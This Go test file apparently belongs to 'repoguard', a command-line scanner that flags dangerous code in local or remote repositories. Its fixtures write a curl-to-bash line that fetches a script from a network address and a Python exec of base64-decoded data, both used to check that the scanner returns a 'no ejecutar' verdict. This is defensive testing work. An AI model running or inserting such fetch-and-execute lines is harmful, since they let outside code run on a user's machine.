package main

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ulisespignatelli/repoguard/internal/remote"
	. "github.com/ulisespignatelli/repoguard/internal/testutil"
)

func runCLI(args ...string) (int, string, string) {
	var o, e bytes.Buffer
	c := run(args, &o, &e)
	return c, o.String(), e.String()
}

func TestLocalAndExitCodes(t *testing.T) {
	root := t.TempDir()
	if c, out, _ := runCLI("scan", root); c != 0 || !strings.Contains(out, "SIN SEÑALES") {
		t.Fatalf("%d %s", c, out)
	}
	_ = os.WriteFile(filepath.Join(root, "i.sh"), []byte(J("cur", "l http://198.18.7.21/a | ", "bash\n")), 0o644)
	c, out, _ := runCLI("scan", root)
	if c != 1 || !strings.Contains(out, "NO EJECUTAR") {
		t.Fatalf("%d %s", c, out)
	}
	if c, _, _ := runCLI("scan", root, "--fail-on", "critica", "--exclude", "*.sh"); c != 0 {
		t.Fatalf("con exclusión debería salir 0, salió %d", c)
	}
}

func TestRemoteWithFakeClone(t *testing.T) {
	src := t.TempDir()
	_ = os.WriteFile(filepath.Join(src, "x.py"), []byte(J("ex", "ec(base64.b64", "decode('", Rand(60, B64, 3), "'))\n")), 0o644)
	old := cloneFunc
	defer func() { cloneFunc = old }()
	cloneFunc = func(_ context.Context, r remote.Repo, _ string) (string, func(), error) {
		if r.FullName() != "acme/tool" {
			t.Fatalf("repo %s", r.FullName())
		}
		return src, func() {}, nil
	}
	c, out, _ := runCLI("scan", "https://github.com/acme/tool", "--format", "json")
	var doc struct {
		Target struct{ Target string }
		Result struct {
			Verdict struct{ Level string }
		}
	}
	if err := json.Unmarshal([]byte(out), &doc); err != nil || c != 1 || doc.Target.Target != "acme/tool" || doc.Result.Verdict.Level != "no_ejecutar" {
		t.Fatalf("%d %v %s", c, err, out)
	}
}

func TestBadArgs(t *testing.T) {
	for _, a := range [][]string{{}, {"x"}, {"scan"}, {"scan", "no existe ni es repo"}, {"scan", ".", "--format", "xml"}} {
		if c, _, _ := runCLI(a...); c != 2 {
			t.Errorf("%v: salió %d", a, c)
		}
	}
}
